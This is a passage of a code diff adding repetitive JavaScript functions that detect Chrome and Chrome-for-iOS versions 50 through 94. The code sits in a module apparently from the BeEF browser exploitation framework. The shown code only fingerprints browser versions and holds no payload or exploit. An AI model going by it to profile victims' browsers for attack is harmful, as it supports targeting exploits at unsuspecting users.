+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 50) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 51.
+     * @example: beef.browser.isC51()
+     */
+    isC51: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 51) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 51.
+     * @example: beef.browser.isC51iOS()
+     */
+    isC51iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 51) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 52.
+     * @example: beef.browser.isC52()
+     */
+    isC52: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 52) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 52.
+     * @example: beef.browser.isC52iOS()
+     */
+    isC52iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 52) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 53.
+     * @example: beef.browser.isC53()
+     */
+    isC53: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 53) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 53.
+     * @example: beef.browser.isC53iOS()
+     */
+    isC53iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 53) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 54.
+     * @example: beef.browser.isC54()
+     */
+    isC54: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 54) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 54.
+     * @example: beef.browser.isC54iOS()
+     */
+    isC54iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 54) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 55.
+     * @example: beef.browser.isC55()
+     */
+    isC55: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 55) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 55.
+     * @example: beef.browser.isC55iOS()
+     */
+    isC55iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 55) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 56.
+     * @example: beef.browser.isC56()
+     */
+    isC56: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 56) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 56.
+     * @example: beef.browser.isC56iOS()
+     */
+    isC56iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 56) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 57.
+     * @example: beef.browser.isC57()
+     */
+    isC57: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 57) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 57.
+     * @example: beef.browser.isC57iOS()
+     */
+    isC57iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 57) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 58.
+     * @example: beef.browser.isC58()
+     */
+    isC58: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 58) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 58.
+     * @example: beef.browser.isC58iOS()
+     */
+    isC58iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 58) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 59.
+     * @example: beef.browser.isC59()
+     */
+    isC59: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 59) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 59.
+     * @example: beef.browser.isC59iOS()
+     */
+    isC59iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 59) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 60.
+     * @example: beef.browser.isC60()
+     */
+    isC60: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 60) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 60.
+     * @example: beef.browser.isC60iOS()
+     */
+    isC60iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 60) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 61.
+     * @example: beef.browser.isC61()
+     */
+    isC61: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 61) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 61.
+     * @example: beef.browser.isC61iOS()
+     */
+    isC61iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 61) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 62.
+     * @example: beef.browser.isC62()
+     */
+    isC62: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 62) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 62.
+     * @example: beef.browser.isC62iOS()
+     */
+    isC62iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 62) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 63.
+     * @example: beef.browser.isC63()
+     */
+    isC63: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 63) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 63.
+     * @example: beef.browser.isC63iOS()
+     */
+    isC63iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 63) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 64.
+     * @example: beef.browser.isC64()
+     */
+    isC64: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 64) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 64.
+     * @example: beef.browser.isC64iOS()
+     */
+    isC64iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 64) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 65.
+     * @example: beef.browser.isC65()
+     */
+    isC65: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 65) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 65.
+     * @example: beef.browser.isC65iOS()
+     */
+    isC65iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 65) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 66.
+     * @example: beef.browser.isC66()
+     */
+    isC66: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 66) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 66.
+     * @example: beef.browser.isC66iOS()
+     */
+    isC66iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 66) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 67.
+     * @example: beef.browser.isC67()
+     */
+    isC67: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 67) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 67.
+     * @example: beef.browser.isC67iOS()
+     */
+    isC67iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 67) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 68.
+     * @example: beef.browser.isC68()
+     */
+    isC68: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 68) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 68.
+     * @example: beef.browser.isC68iOS()
+     */
+    isC68iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 68) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 69.
+     * @example: beef.browser.isC69()
+     */
+    isC69: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 69) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 69.
+     * @example: beef.browser.isC69iOS()
+     */
+    isC69iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 69) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 70.
+     * @example: beef.browser.isC70()
+     */
+    isC70: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 70) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 70.
+     * @example: beef.browser.isC70iOS()
+     */
+    isC70iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 70) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 71.
+     * @example: beef.browser.isC71()
+     */
+    isC71: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 71) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 71.
+     * @example: beef.browser.isC71iOS()
+     */
+    isC71iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 71) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 72.
+     * @example: beef.browser.isC72()
+     */
+    isC72: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 72) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 72.
+     * @example: beef.browser.isC72iOS()
+     */
+    isC72iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 72) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 73.
+     * @example: beef.browser.isC73()
+     */
+    isC73: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 73) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 73.
+     * @example: beef.browser.isC73iOS()
+     */
+    isC73iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 73) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 74.
+     * @example: beef.browser.isC74()
+     */
+    isC74: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 74) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 74.
+     * @example: beef.browser.isC74iOS()
+     */
+    isC74iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 74) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 75.
+     * @example: beef.browser.isC75()
+     */
+    isC75: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 75) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 75.
+     * @example: beef.browser.isC75iOS()
+     */
+    isC75iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 75) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 76.
+     * @example: beef.browser.isC76()
+     */
+    isC76: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 76) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 76.
+     * @example: beef.browser.isC76iOS()
+     */
+    isC76iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 76) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 77.
+     * @example: beef.browser.isC77()
+     */
+    isC77: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 77) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 77.
+     * @example: beef.browser.isC77iOS()
+     */
+    isC77iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 77) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 78.
+     * @example: beef.browser.isC78()
+     */
+    isC78: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 78) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 78.
+     * @example: beef.browser.isC78iOS()
+     */
+    isC78iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 78) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 79.
+     * @example: beef.browser.isC79()
+     */
+    isC79: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 79) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 79.
+     * @example: beef.browser.isC79iOS()
+     */
+    isC79iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 79) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 80.
+     * @example: beef.browser.isC80()
+     */
+    isC80: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 80) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 80.
+     * @example: beef.browser.isC80iOS()
+     */
+    isC80iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 80) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 81.
+     * @example: beef.browser.isC81()
+     */
+    isC81: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 81) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 81.
+     * @example: beef.browser.isC81iOS()
+     */
+    isC81iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 81) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 82.
+     * @example: beef.browser.isC82()
+     */
+    isC82: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 82) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 82.
+     * @example: beef.browser.isC82iOS()
+     */
+    isC82iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 82) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 83.
+     * @example: beef.browser.isC83()
+     */
+    isC83: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 83) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 83.
+     * @example: beef.browser.isC83iOS()
+     */
+    isC83iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 83) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 84.
+     * @example: beef.browser.isC84()
+     */
+    isC84: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 84) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 84.
+     * @example: beef.browser.isC84iOS()
+     */
+    isC84iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 84) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 85.
+     * @example: beef.browser.isC85()
+     */
+    isC85: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 85) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 85.
+     * @example: beef.browser.isC85iOS()
+     */
+    isC85iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 85) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 86.
+     * @example: beef.browser.isC86()
+     */
+    isC86: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 86) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 86.
+     * @example: beef.browser.isC86iOS()
+     */
+    isC86iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 86) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 87.
+     * @example: beef.browser.isC87()
+     */
+    isC87: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 87) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 87.
+     * @example: beef.browser.isC87iOS()
+     */
+    isC87iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 87) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 88.
+     * @example: beef.browser.isC88()
+     */
+    isC88: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 88) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 88.
+     * @example: beef.browser.isC88iOS()
+     */
+    isC88iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 88) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 89.
+     * @example: beef.browser.isC89()
+     */
+    isC89: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 89) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 89.
+     * @example: beef.browser.isC89iOS()
+     */
+    isC89iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 89) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 90.
+     * @example: beef.browser.isC90()
+     */
+    isC90: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 90) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 90.
+     * @example: beef.browser.isC90iOS()
+     */
+    isC90iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 90) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 91.
+     * @example: beef.browser.isC91()
+     */
+    isC91: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 91) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 91.
+     * @example: beef.browser.isC91iOS()
+     */
+    isC91iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 91) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 92.
+     * @example: beef.browser.isC92()
+     */
+    isC92: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 92) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 92.
+     * @example: beef.browser.isC92iOS()
+     */
+    isC92iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 92) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 93.
+     * @example: beef.browser.isC93()
+     */
+    isC93: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 93) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 93.
+     * @example: beef.browser.isC93iOS()
+     */
+    isC93iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 93) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 94.
+     * @example: beef.browser.isC94()
+     */
+    isC94: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 94) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 94.
+     * @example: beef.browser.isC94iOS()
+     */
+    isC94iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 94) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 95.
